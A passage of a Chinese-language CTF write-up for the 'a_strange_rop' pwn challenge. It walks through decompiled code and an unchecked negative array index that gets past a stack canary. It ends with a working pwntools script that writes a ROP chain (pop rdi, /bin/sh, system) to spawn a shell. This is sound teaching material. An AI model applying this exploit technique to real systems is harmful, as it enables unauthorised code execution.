__isoc99_scanf(&amp;DAT_00402085,&amp;id);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-number">9</span> &lt; (<span class="hljs-type">int</span>)id) &#123;<br>      <span class="hljs-built_in">puts</span>(&amp;DAT_00402088);<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0x1bf52</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(&amp;DAT_004020a8);<br>    __isoc99_scanf(&amp;DAT_004020b0,local_68 + (<span class="hljs-type">int</span>)id);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(&amp;DAT_004020b8);<br>  local_74 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">do</span> &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-number">9</span> &lt; (<span class="hljs-type">int</span>)local_74) &#123;<br>      uVar4 = <span class="hljs-number">1</span>;<br>LAB_00401548:<br>      <span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>        __stack_chk_fail();<br>      &#125;<br>      <span class="hljs-keyword">return</span> uVar4;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((&amp;answer)[(<span class="hljs-type">int</span>)local_74] != local_68[(<span class="hljs-type">int</span>)local_74]) &#123;<br>      <span class="hljs-built_in">printf</span>(&amp;DAT_004020d8,(ulong)local_74);<br>      uVar4 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">goto</span> LAB_00401548;<br>    &#125;<br>    local_74 = local_74 + <span class="hljs-number">1</span>;<br>  &#125; <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> );<br>&#125;<br></code></pre></td></tr></table></figure><p>运行起来是这么个样子</p><p><img src="/images/1.png" alt="交互"></p><p>略微有点长，但是并不难理解，local_10为随机生成的canary值，因此不能直接溢出覆盖返回地址，否则会触发canary检测程序直接退出</p><p>题目要求回答一些小学数学题目，全部回答正确就跳转到win函数，但是我们已经看到win函数并没有实际作用，因此思路依旧是覆盖返回地址为我们构造的rop链</p><p>先来分析一下栈布局</p><p>定义了一个数组local_68[11]</p><p>可以分析得出</p><p><img src="/images/2.png" alt="栈布局大致如此"></p><p>题目设置了一个小check机制，明明有0到9十道题目，但是数组设置了0到10十一个题目编号，而输入的题目编号大于9的时候程序自动退出，并大声斥责我们<em>你想干什么!</em></p><p>我的第一个思路是设置题目编号为8，即local_68[9]所在的位置，向上填充至覆盖rip，执行rop链</p><p>但是这个canary是我永远越不过的坎…</p><p>思来想去，我突然注意到，题目编号大于9时会自动退出，<strong>但是</strong>题目却不检查负数编号!</p><p>因此我们可以将题目设置为负数通过负索引去写前面的地址!</p><p>用gdb看一看怎么个事儿</p><p>我在第一次输入后打上了断点，输入编号<code>-1</code>并输入答案<code>666</code>，local_68在rbp下0x60的位置，我们看看更下面的情况</p><p><img src="/images/3.png" alt="地址情况"></p><p>可以看到，正如我们分析的那般，<code>-1</code>索引写的<code>666</code>代表的<code>00029a</code>写在了local_68下方的地址，再认真一看，前方的<code>0x004014bc</code>不正是另一个函数的返回地址吗!</p><p>我们只需要将索引设置为-3便可以覆盖另一个函数的返回地址来执行我们的rop链</p><p>这个函数用canary将我们拦住，十分安全，可是，另一个函数却已经悄然被我们所攻克…</p><p>题目也是十分贴心，<code>/bin/sh</code>字符串都帮我们准备好了</p><p>接下来便很简单了</p><p>exp也是十分优雅</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;host&#x27;</span>,port)<br><br>bin_sh = <span class="hljs-built_in">str</span>(<span class="hljs-number">4210808</span>)   <span class="hljs-comment"># 0x404078</span><br>call_system = <span class="hljs-built_in">str</span>(<span class="hljs-number">4199136</span>)   <span class="hljs-comment"># 0x4012e0</span><br>pop_rdi_ret = <span class="hljs-built_in">str</span>(<span class="hljs-number">4199153</span>)  <span class="hljs-comment"># 0x4012f1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_pair</span>(<span class="hljs-params">idx, val</span>):<br>    p.recvuntil(<span class="hljs-string">&#x27;题目编号:&#x27;</span>)<br>    p.send(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;idx&#125;</span>\n&quot;</span>.encode())<br>    p.recvuntil(<span class="hljs-string">&#x27;结果:&#x27;</span>)<br>    p.send(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;val&#125;</span>\n&quot;</span>.encode())<br><br>send_pair(-<span class="hljs-number">2</span>, bin_sh)    <span class="hljs-comment"># 写 /bin/sh</span><br>send_pair(-<span class="hljs-number">1</span>, call_system)   <span class="hljs-comment"># 调用 system</span><br>send_pair(-<span class="hljs-number">3</span>, pop_rdi_ret)  <span class="hljs-comment"># 覆盖另一个函数的rip</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>最后也是成功地拿到shell</p><p>至此，终于理解题目为什么叫:<code>a_strange_rop</code>!</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
